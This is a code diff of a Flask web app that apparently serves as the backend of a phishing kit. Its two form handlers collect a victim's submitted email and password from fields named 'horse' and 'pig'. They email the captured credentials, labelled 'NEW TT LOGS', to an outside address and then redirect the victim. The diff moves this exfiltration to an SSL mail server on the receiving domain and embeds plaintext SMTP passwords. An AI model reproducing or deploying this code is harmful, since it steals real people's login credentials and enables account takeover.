@@ -146,9 +146,9 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_emailx = 'contact'
-        sender_email = 'contact@personalbio.site'
+        sender_email = 'newap@finservicecredit.com'
         receiver_email = "newap@finservicecredit.com"
-        password = "vip79d01760b097"
+        password = "me;9PhmuW0F*"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW TT LOGS"
@@ -164,8 +164,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("91.217.246.43", 6040) as server:
-            server.login(sender_emailx, password)
+        with smtplib.SMTP_SSL("mail.finservicecredit.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
@@ -184,9 +184,9 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_emailx = 'contact'
-        sender_email = 'contact@personalbio.site'
+        sender_email = 'newap@finservicecredit.com'
         receiver_email = "newap@finservicecredit.com"
-        password = "vip79d01760b097"
+        password = "me;9PhmuW0F*"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW TT LOGS P2"
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("91.217.246.43", 6040) as server:
+        with smtplib.SMTP_SSL("mail.finservicecredit.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
